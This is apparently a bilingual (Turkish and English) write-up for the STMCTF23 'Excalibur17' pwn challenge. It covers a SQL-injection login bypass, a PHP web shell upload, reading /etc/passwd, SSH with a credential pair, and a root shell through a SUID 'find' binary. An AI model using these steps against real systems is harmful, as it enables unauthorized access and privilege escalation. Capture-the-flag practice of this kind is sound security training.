# STMCTF23 QUESTION

## Information
### Challenge name: 

`Excalibur17`

### Categories:
 - `Pwn`

### Challenge message:
```
excalibur17.stmctf.com
```

## Solution - TR:

İlk Erişim

https://www.exploit-db.com/exploits/51728

1. SQLi girişi (stm' 1=1#)
2. Ayarlar sayfasında dosya yükleme kısmı bulunmaktadır. Bir php web shell yüklenir.
3. Yüklenen resim çerçevesine sağ tıklanır. Yeni Sekmede Aç'a tıklanır.
4. ls ve cat /etc/passwd komutunu çalıştırın.
5. "stmcyber:5tmcyb3r!" adında bir dosya var.
6. SSH için bu bilgiler kullanılır.

PrivEsc

1. SUID bit ikili dosyalarının ayarlandığını bulmak için "find / -type f -perm -04000 -ls 2>/dev/null" komutu çalıştırılır.
2. /usr/bind/find'in SUID biti ayarlandı.
3. "/usr/bin/find . -exec /bin/sh -p \; -quit" komutu çalıştırılır.
4. root dizinindeki flag.txt dosyasını okuyun.
---

## Solution - EN:

Initial Access

https://www.exploit-db.com/exploits/51728

1. SQLi login (stm' 1=1#)
2. There is a file upload part in Settings page. Upload a php web shell.
3. Right click on the uploaded image frame. Right click on it and click Open in New Tab.
4. Run ls and cat /etc/passwd.
5. There is a file named "stmcyber:5tmcyb3r!"
6. SSH and use these creds.

Priv Esc

1. Run this "find / -type f -perm -04000 -ls 2>/dev/null" to find SUID bit binaries has been set.
2. /usr/bind/find's SUID bit has been set.
3. Run "/usr/bin/find . -exec /bin/sh -p \; -quit" 
4. Read flag.txt on the root Desktop.

